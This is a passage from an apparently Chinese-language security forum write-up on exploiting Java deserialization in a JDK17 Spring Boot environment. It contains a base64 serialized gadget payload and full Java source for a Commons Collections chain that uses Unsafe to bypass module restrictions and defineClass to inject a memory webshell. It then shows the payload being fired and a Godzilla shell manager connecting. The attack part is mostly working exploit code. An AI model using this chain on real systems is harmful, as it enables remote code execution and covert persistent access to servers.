WwAFaUFyZ3NxAH4AFFsAC2lQYXJhbVR5cGVzcQB+ABZ4cHVxAH4AGAAAAAB1cQB+ABsAAAAAc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQACnZhbHVldmFsdWV4"));
                System.out.println("[" + protocol + "] Sending serialized gadget");
            }
```

这里的base64编码的内容就是当前环境下存在CC依赖或者CB依赖的情况下，基本的反序列化利用链。应该还有很多的其他Springboot原生依赖下的利用链，同样也能达到效果，只不过这里演示的话就直接用CC了，理解的清晰一点：

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.Unsafe;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.invoke.MethodHandles;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * Hello world!
 *
 */
public class Demo
{
    public static void main(String[] args) throws Exception{
        patchModule(Demo.class);

        String shellinject="yourmemshellbyte";
//        String s = shellinject.replaceAll(" +","+");
        //byte[] data=Files.readAllBytes(Paths.get("H:\\ASecuritySearch\\javasecurity\\CC1\\JDK17Ser\\src\\main\\java\\org\\example\\shell.class"));;
        byte[] data=Base64.getDecoder().decode(shellinject);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(MethodHandles.class),
                new InvokerTransformer("getDeclaredMethod", new
                           Class[]{String.class, Class[].class}, new Object[]{"lookup", new
                        Class[0]}),
                new InvokerTransformer("invoke", new Class[]
                        {Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]
                        {byte[].class}, new Object[]{data}),
                new InstantiateTransformer(new Class[0], new
                        Object[0]),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new
                Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        innerMap.remove("keykey");

        setFieldValue(transformerChain,"iTransformers",transformers);
        System.out.println(Base64.getEncoder().encodeToString(serialize(expMap)));
        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(serialize(expMap))));

    }

    private static void patchModule(Class classname){
        try {
            Class UnsafeClass=Class.forName("sun.misc.Unsafe");
            Field unsafeField=UnsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe=(Unsafe) unsafeField.get(null);
            Module ObjectModule=Object.class.getModule();

            Class currentClass=classname.getClass();
            long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.getAndSetObject(currentClass,addr,ObjectModule);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static byte[] serialize(Object object) {
        try {
            ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(object);
            objectOutputStream.close();
            return byteArrayOutputStream.toByteArray();
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

}

```

具体为什么这么写，参考JDK17模块化绕过的文章即可，其他师傅也写了更好的解析文章。

尝试打入：

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-b2f9d97d12d4dced40bfef2187a992e1d171bb14.png)​

拿基本的godzilla或者其他的shell管理工具都行，这里只做最简单的演示

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-f463ee07c7455dc542c2de078bc7e89eeabb7738.png)​

后记
==

学习的时候还看了1ue师傅写的关于JDK20+之JNDI注入Bypass思路的文章，其实X1roz师傅的JNDIMap工具中也封装了这个思路，不过本文的内容有点长了，就不补充了,师傅们可以参考如下链接继续看一下：

<https://vidar-team.feishu.cn/docx/ScXKd2ISEo8dL6xt5imcQbLInGc>

<https://github.com/X1r0z/JNDIMap>

[https://tttang.com/archive/1405/#toc\\\_0x00](https://tttang.com/archive/1405/#toc%5C_0x00)